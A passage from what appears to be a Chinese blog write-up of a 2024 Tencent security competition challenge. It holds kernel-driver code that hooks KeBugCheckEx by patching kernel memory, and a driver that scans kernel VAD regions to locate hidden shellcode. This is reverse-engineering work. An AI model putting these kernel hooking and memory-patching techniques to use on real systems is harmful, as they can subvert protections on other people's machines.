Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(* FuncPtr)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    _In_ ULONG BugCheckCode,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR BugCheckParameter1,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR BugCheckParameter2,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR BugCheckParameter3,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR BugCheckParameter4</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ULONG  <span class="title function_">myKeBugCheckEx</span><span class="params">(_In_ ULONG BugCheckCode,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR BugCheckParameter1,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR BugCheckParameter2,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR BugCheckParameter3,</span></span><br><span class="line"><span class="params">    _In_ ULONG_PTR BugCheckParameter4</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    Unhook();</span><br><span class="line">    FuncPtr func = (FuncPtr)target;</span><br><span class="line"></span><br><span class="line">    PVOID backtrace[MAX_BACKTRACE_DEPTH];</span><br><span class="line">USHORT capturedFrames = RtlCaptureStackBackTrace(<span class="number">0</span>, MAX_BACKTRACE_DEPTH, backtrace, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span> (USHORT i = <span class="number">0</span>; i &lt; capturedFrames; i++) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;xia0ji233:Backtrace[%u]: %p\n&quot;</span>), i, backtrace[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kprintf((<span class="string">&quot;calling KeBugCheckEx(%p,%p,%p,%p,%p)\n&quot;</span>),BugCheckCode,BugCheckParameter1,BugCheckParameter2,BugCheckParameter3,BugCheckParameter4);</span><br><span class="line">    DbgBreakPoint();</span><br><span class="line">    LARGE_INTEGER inTime;</span><br><span class="line">inTime.QuadPart = (LONGLONG) - <span class="number">10</span> * <span class="number">1000</span> * <span class="number">1000</span> * <span class="number">3600</span>;</span><br><span class="line">KeDelayExecutionThread(KernelMode, FALSE, &amp;inTime);</span><br><span class="line"></span><br><span class="line">    ULONG64 s = func(BugCheckCode,BugCheckParameter1,BugCheckParameter2,BugCheckParameter3,BugCheckParameter4);</span><br><span class="line">    Hook();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MDLWriteMemory(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize)</span><br><span class="line">&#123;</span><br><span class="line">    PMDL pMdl = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pNewAddress = <span class="literal">NULL</span>;</span><br><span class="line">    pMdl = MmCreateMdl(<span class="literal">NULL</span>, pBaseAddress, writeDataSize);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pMdl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    MmBuildMdlForNonPagedPool(pMdl);</span><br><span class="line">    pNewAddress = MmMapLockedPages(pMdl, KernelMode);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pNewAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        IoFreeMdl(pMdl);</span><br><span class="line">    &#125;</span><br><span class="line">    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);</span><br><span class="line">    MmUnmapLockedPages(pNewAddress, pMdl);</span><br><span class="line">    IoFreeMdl(pMdl);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start unload\n&quot;</span>), __LINE__);</span><br><span class="line">    Unhook();</span><br><span class="line">    DeleteDevice(pDriver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: RegistryPath = %S\n&quot;</span>), __LINE__, RegistryPath-&gt;Buffer);</span><br><span class="line">    UNICODE_STRING unName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitUnicodeString(&amp;unName, <span class="string">L&quot;KeBugCheckEx&quot;</span>);</span><br><span class="line">target = ((ULONG64)MmGetSystemRoutineAddress(&amp;unName))+<span class="number">5</span>;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: KeBugCheckEx=%p\n&quot;</span>), __LINE__, target);</span><br><span class="line">    g_Object = DriverObject;</span><br><span class="line">    <span class="keyword">if</span> (target) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(oldcode); i++) &#123;</span><br><span class="line">            oldcode[i] = target[i];</span><br><span class="line">        &#125;</span><br><span class="line">        *(UINT64*)(newcode + <span class="number">2</span>) = myKeBugCheckEx;</span><br><span class="line">        Hook();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;xia0ji233:hahaha&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里去hook KeBugCheckEx，然后直接让它 sleep 一小时，防止它蓝我，我有更多时间可以去分析。</p><img src="/2024/04/22/tencent-race-2024-pre-final/19.png" class=""><p>直接拿捏住了蓝屏。</p><p>在后面的分析中发现了 GameSec.exe 的内存一直在被读，估计是在搜索进程，然后读取进程的内存，这一部分后面没有分析太出来。</p><p>并且在运行的时候发现会读一些 exe 文件的字符串，在 shellcode 开头 + 80 的位置，这里后续没继续分析了。</p><img src="/2024/04/22/tencent-race-2024-pre-final/2_1.png" class=""><h4 id="编写一个search程序，在Load驱动运行后找到内核内存空间中的shellcode，输出shellcode范围内的任意地址"><a href="#编写一个search程序，在Load驱动运行后找到内核内存空间中的shellcode，输出shellcode范围内的任意地址" class="headerlink" title="编写一个search程序，在Load驱动运行后找到内核内存空间中的shellcode，输出shellcode范围内的任意地址"></a>编写一个search程序，在Load驱动运行后找到内核内存空间中的shellcode，输出shellcode范围内的任意地址</h4><p>随后想到去dump shellcode，这里注册回调的方式并不能成功拦截住，因此想到直接去 hook，判断线程起始位置是否在模块范围内，或者说在 Loader.sys 范围内，如果有都输出然后调试器看看内存像不像shellcode，无果，于是选择去跟一下，结果跟到一个类似shellcode的地方（很多浮点指令，看起来像垃圾指令的混淆），dump下来用 010 分析。</p><h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><p>通过内存地址的特征可以发现，前八位可以通过 VAD 的方式去获取，后四个位每次加载似乎都是固定的，因此只需要爆破两个字节用一个特征去匹配就行了，这里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vad.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="comment">// 定义VAD相对于EProcess头部偏移值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> eprocess_offset_VadRoot 0x658</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> eprocess_offset_VadCount 0x668</span></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">EnumVad</span><span class="params">(PMMVAD Root, PALL_VADS pBuffer, ULONG nCnt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!Root || !pBuffer || !nCnt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (nCnt &gt; pBuffer-&gt;nCnt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 得到起始页与结束页</span></span><br><span class="line">            ULONG64 endptr = (ULONG64)Root-&gt;Core.EndingVpnHigh;</span><br><span class="line">            endptr = endptr &lt;&lt; <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">            ULONG64 startptr = (ULONG64)Root-&gt;Core.StartingVpnHigh;</span><br><span class="line">            startptr = startptr &lt;&lt; <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 得到根节点</span></span><br><span class="line">            pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].pVad = (ULONG_PTR)Root;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 起始页: startingVpn * 0x1000</span></span><br><span class="line">            pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].startVpn = (startptr | Root-&gt;Core.StartingVpn) &lt;&lt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 结束页: EndVpn * 0x1000 + 0xfff</span></span><br><span class="line">            pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].endVpn = ((endptr | Root-&gt;Core.EndingVpn) &lt;&lt; PAGE_SHIFT) + <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// VAD标志 928 = Mapped    1049088 = Private   ....</span></span><br><span class="line">            pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].flags = Root-&gt;Core.u1.Flags.flag;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 验证节点可读性</span></span><br><span class="line">            <span class="keyword">if</span> (MmIsAddressValid(Root-&gt;Subsection) &amp;&amp; MmIsAddressValid(Root-&gt;Subsection-&gt;ControlArea))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (MmIsAddressValid((PVOID)((Root-&gt;Subsection-&gt;ControlArea-&gt;FilePointer.Value &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">4</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].pFileObject = ((Root-&gt;Subsection-&gt;ControlArea-&gt;FilePointer.Value &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            pBuffer-&gt;nCnt++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (MmIsAddressValid(Root-&gt;Core.VadNode.Left))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 递归枚举左子树</span></span><br><span class="line">            EnumVad((PMMVAD)Root-&gt;Core.VadNode.Left, pBuffer, nCnt);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (MmIsAddressValid(Root-&gt;Core.VadNode.Right))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 递归枚举右子树</span></span><br><span class="line">            EnumVad((PMMVAD)Root-&gt;Core.VadNode.Right, pBuffer, nCnt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOLEAN <span class="title function_">EnumProcessVad</span><span class="params">(ULONG Pid, PALL_VADS pBuffer, ULONG nCnt)</span></span><br><span class="line">&#123;</span><br><span class="line">    PEPROCESS Peprocess = <span class="number">0</span>;</span><br><span class="line">    PRTL_AVL_TREE Table = <span class="literal">NULL</span>;</span><br><span class="line">    PMMVAD Root = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过进程PID得到进程EProcess</span></span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)Pid, &amp;Peprocess)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 与偏移相加得到VAD头节点</span></span><br><span class="line">        Table = (PRTL_AVL_TREE)((UCHAR*)Peprocess + eprocess_offset_VadRoot);</span><br><span class="line">        <span class="keyword">if</span> (!MmIsAddressValid(Table) || !eprocess_offset_VadRoot)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        __try</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 取出头节点</span></span><br><span class="line">            Root = (PMMVAD)Table-&gt;Root;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nCnt &gt; pBuffer-&gt;nCnt)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 得到起始页与结束页</span></span><br><span class="line">                ULONG64 endptr = (ULONG64)Root-&gt;Core.EndingVpnHigh;</span><br><span class="line">                endptr = endptr &lt;&lt; <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">                ULONG64 startptr = (ULONG64)Root-&gt;Core.StartingVpnHigh;</span><br><span class="line">                startptr = startptr &lt;&lt; <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">                pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].pVad = (ULONG_PTR)Root;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 起始页: startingVpn * 0x1000</span></span><br><span class="line">                pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].startVpn = (startptr | Root-&gt;Core.StartingVpn) &lt;&lt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 结束页: EndVpn * 0x1000 + 0xfff</span></span><br><span class="line">                pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].endVpn = (endptr | Root-&gt;Core.EndingVpn) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">                pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].flags = Root-&gt;Core.u1.Flags.flag;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (MmIsAddressValid(Root-&gt;Subsection) &amp;&amp; MmIsAddressValid(Root-&gt;Subsection-&gt;ControlArea))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (MmIsAddressValid((PVOID)((Root-&gt;Subsection-&gt;ControlArea-&gt;FilePointer.Value &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">4</span>)))</span><br><span class="line">                    &#123;</span><br><span class="line">                        pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].pFileObject = ((Root-&gt;Subsection-&gt;ControlArea-&gt;FilePointer.Value &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                pBuffer-&gt;nCnt++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 枚举左子树</span></span><br><span class="line">            <span class="keyword">if</span> (Table-&gt;Root-&gt;Left)</span><br><span class="line">            &#123;</span><br><span class="line">                EnumVad((MMVAD*)Table-&gt;Root-&gt;Left, pBuffer, nCnt);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 枚举右子树</span></span><br><span class="line">            <span class="keyword">if</span> (Table-&gt;Root-&gt;Right)</span><br><span class="line">            &#123;</span><br><span class="line">                EnumVad((MMVAD*)Table-&gt;Root-&gt;Right, pBuffer, nCnt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        __finally</span><br><span class="line">        &#123;</span><br><span class="line">            ObDereferenceObject(Peprocess);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">UnDriver</span><span class="params">(PDRIVER_OBJECT driver)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;unload\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT Driver, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;hello xia0ji233\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG nPid;</span><br><span class="line">        ULONG nSize;</span><br><span class="line">        PALL_VADS pBuffer;</span><br><span class="line">    &#125;VADProcess;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        VADProcess vad = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">        vad.nPid = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 默认有1000个线程</span></span><br><span class="line">        vad.nSize = <span class="keyword">sizeof</span>(VAD_INFO) * <span class="number">0x5000</span> + <span class="keyword">sizeof</span>(ULONG);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分配临时空间</span></span><br><span class="line">        vad.pBuffer = (PALL_VADS)ExAllocatePool(PagedPool, vad.nSize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据传入长度得到枚举数量</span></span><br><span class="line">        ULONG nCount = (vad.nSize - <span class="keyword">sizeof</span>(ULONG)) / <span class="keyword">sizeof</span>(VAD_INFO);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 枚举VAD</span></span><br><span class="line">        EnumProcessVad(vad.nPid, vad.pBuffer, nCount);</span><br><span class="line">        </span><br><span class="line">        <span class="type">uintptr_t</span> addr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ULONG64 i = <span class="number">0x0</span>; i &lt;<span class="number">65536</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            addr = vad.pBuffer-&gt;VadInfos[<span class="number">0</span>].pVad &amp; <span class="number">0xffffffff00000000</span>;</span><br><span class="line">            addr = addr + <span class="number">0x1000</span>;</span><br><span class="line">            addr = addr + (i&lt;&lt;<span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> (MmIsAddressValid((PVOID)addr) &amp;&amp; *((ULONG64 *)addr) == <span class="number">0x7C8B483024748B48</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                kprintf((<span class="string">&quot;shellcode found in %p\n&quot;</span>), addr);</span><br><span class="line">                <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Something Error1\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">end:</span><br><span class="line">    Driver-&gt;DriverUnload = UnDriver;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vad.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span 